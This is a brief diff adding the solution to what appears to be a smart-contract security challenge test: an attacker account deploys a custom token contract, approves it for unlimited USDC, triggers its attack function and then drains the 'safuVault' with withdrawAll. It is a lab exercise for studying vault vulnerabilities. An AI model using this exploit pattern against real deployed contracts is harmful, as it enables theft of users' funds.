@@ -47,6 +47,12 @@ before(async () => {
 it("solves the challenge", async function () {
 
   // implement solution here
+  let z = await ethers.getContractFactory("newToken");
+  let gz = await z.connect(attacker).deploy(usdc.address, safuVault.address)
+  await usdc.connect(attacker).approve(gz.address, ethers.constants.MaxUint256);
+  await gz.connect(attacker).att();
+  await safuVault.connect(attacker).withdrawAll();
+
 
 });
 
